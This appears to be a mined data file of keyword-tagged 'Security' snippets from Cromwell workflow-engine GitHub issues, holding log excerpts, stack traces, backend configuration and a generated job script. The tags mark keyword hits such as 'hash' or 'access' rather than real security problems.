if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4670:2504,PASSWORD,PASSWORDS,2504,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4670,1,['PASSWORD'],['PASSWORDS']
Security,"eys: dx_timeout; [2022-12-15 21:27:50,82] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 cache hit copying success with aggregated hashes: initial = FD7DC79B974CF6706FC3376F067965B9, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,82] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.genetic_sex:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:54,15] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.genetic_sex' (scatter index: None, attempt 1); [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.categorical_covariates:0:1-20000000027 [9e4f5894main.categorical_covariates:0:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.categorical_covariates:0:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.pcs:-1:1 cache hit copying success with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:30533,hash,hashes,30533,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"f gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""service-account""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""service-account"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""europe-west4"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a signif",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:12569,authoriz,authorization,12569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['authoriz'],['authorization']
Security,"f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5804,hash,hashes,5804,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,fail file hashing if the file does not exist,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006:10,hash,hashing,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006,1,['hash'],['hashing']
Security,fault-dispatcher-2666 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2676] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664); at java.lang.String.<init>(String.java:207); at java.lang.StringBuilder.toString(StringBuilder.java:407); at scala.StringContext.standardInterpolator(StringContext.scala:128); at scala.StringContext.s(StringContext.scala:95); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:885); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:881); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:881); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236); at akka.actor.LoggingFSM$class.processEv,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:10640,Hash,HashMap,10640,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,feature request: validate subcommand to accept a zipfile of imports to resolve against,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2879:17,validat,validate,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2879,1,['validat'],['validate']
Security,"fig {; ## Google project; project = ""$PROJECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; compute-service-account = ""default""; # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false; ## Location; location = ""europe-west1"". ; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""$PROJECT""; caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""reference""; }; }; }. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 HDD""; noAddress: false; preemptible: 1; zones: [""europe-west1-b""]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:10864,access,access,10864,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['access'],['access']
Security,"figuration issue, and issues are only found right when using the ""Directory"" Type. To help in understanding my setup, I've included:. **inputs:**; ```; {; ""good_donor_good_recipient.blastdb"": ""../../data/blast/blastdb"",; ""good_donor_good_recipient.fasta"": ""../../data/ref_genomes/pseudomonas.fasta"",; }; ```. **task definition:**; ```; version development; task n {; input {; File fasta ; Directory blastdb; String out_file = ""~{basename(fasta)}.blast""; }; command <<<; export BLASTDB=~{blastdb} ; blastn \; -query ~{fasta} -db nt -num_threads 24 -evalue 1 -outfmt '6' -out ~{out_file}; >>>; output { File out = out_file }; runtime { docker: ""ncbi/blast:2.10.1"" }; }; ```. **confiuration snippet - localization only:**; ```; filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; # Call caching strategies; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""md5""; check-sibling-md5: false; }; }; }; ```. **logs:**; ```; [2020-08-08 19:20:00,49] [error] Failed to hash ""../../data/blast/blastdb"": Is a directory; [2020-08-08 19:20:00,49] [warn] Localization via hard link has failed: /workflows/cromwell-executions/good_donor_good_recipient/f7947643-2729-483f-b987-44ef932f88bd/call-blaster/main/6e4fa8a1-0d72-486e-a9ae-254319c4915d/call-blaster/shard-20/inputs/2058596876/blastdb -> /data/blast/blastdb: Operation not permitted; [2020-08-08 19:20:00,49] [error] 6e4fa8a1:main.blaster:46:1: Hash error (Is a directory), disabling call caching for this job.; ```. **contents of the BLASTDB directory:**; ```; /data/blast/blastdb$ ls; nt.00.nhd nt.01.nhd nt.02.nhd nt.03.nhd nt.04.nhd nt.05.nhd nt.06.nhd nt.07.nhd nt.08.nhd nt.09.nhd nt.10.nhd nt.11.nhd nt.12.nhd nt.13.nhd nt.14.nhd nt.15.nhd nt.16.nhd nt.17.nhd nt.18.nhd nt.19.nhd nt.20.nhd nt.21.nhd nt.22.nhd nt.23.nhd nt.24.nhd nt.nal nt.00.nhi nt.01.nhi nt.02.nhi nt.03.nhi nt.04.nhi nt.05.nhi nt.06.nhi nt.07.nhi nt.08.nhi nt.09.nhi nt.10.nhi nt.11.nhi nt.12.nhi nt.13.nhi nt.14.nh",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737:1641,hash,hash,1641,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737,1,['hash'],['hash']
Security,"figuration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:8841,validat,validateCredential,8841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jerem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2396,access,access,2396,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,fix jes keys to pass validation for default runtime attributes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3662:21,validat,validation,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3662,1,['validat'],['validation']
Security,"flowActor [UUID(fa18fa5f)]: persisting status of RotateGVCFIndex to Running.; 2016-06-01T20:19:00.527-0400: 104257.028: [GC (Allocation Failure) [PSYoungGen: 1821155K->270322K(1864192K)] 4006446K->2894561K(7456768K), 0.1718483 secs] [Times: user=1.22 sys=0.01, real=0.17 secs] ; 2016-06-02 00:19:39,491 ForkJoinPool-3-worker-7 ERROR - Exception not convertible into handled response; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; at com.goo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:2528,secur,security,2528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['secur'],['security']
Security,"flowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/dockstore_tools/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl#checker; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_7264114231127246601/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl#md5sum; ../../../../tmp/cwl_temp_dir_7264114231127246601/cwl_temp_file_a3cb6a14-3672-4132-8a24-2e0a4e66ff96.cwl:26:5: Field run contains undefined reference to file",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366:2000,Validat,ValidationException,2000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366,1,['Validat'],['ValidationException']
Security,"fo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${tmpDir}/err.$$""; mkfifo ""$oute4a6eeab"" ""$erre4a6eeab""; trap 'rm ""$oute4a6eeab"" ""$erre4a6eeab""' EXIT; tee '/cromwell_root/stdout' < ""$oute4a6eeab"" &; tee '/cromwell_root/stderr' < ""$erre4a6eeab"" >&2 &; (; cd /cromwell_root. /usr/gitc/gatk4/gatk-launch --javaOptions ""-XX:GCTimeLimit=50 -XX:GCHeapFreeLimit=10 -XX:+PrintFlagsFinal \; -XX:+PrintGCTimeStamps -XX:+PrintGCDateSta",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:2124,access,access,2124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"frog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/anichols/Library/Caches/Coursier/v1/https/broadinstitute.jfrog.io/broadinstitute/libs-release/org/broadinstitute/heterodon/1.0.0-beta1/heterodon-1.0.0-beta1-single.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:11:1: checking field `steps`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:19:3: checking object `../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl#compile`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/c8eb79b9-eee9-4796-b374-4841ff18a27d.cwl:20:5: Field `run` contains undefined reference to `file:///var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4796-b374-4841ff18a27d.temp.3969925185320342713/arguments.cwl`; ../../../../../var/folders/g_/4k204pzx6sg6gcnqc2bqfykxx8k880/T/c8eb79b9-eee9-4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4190:1619,Validat,ValidationException,1619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4190,1,['Validat'],['ValidationException']
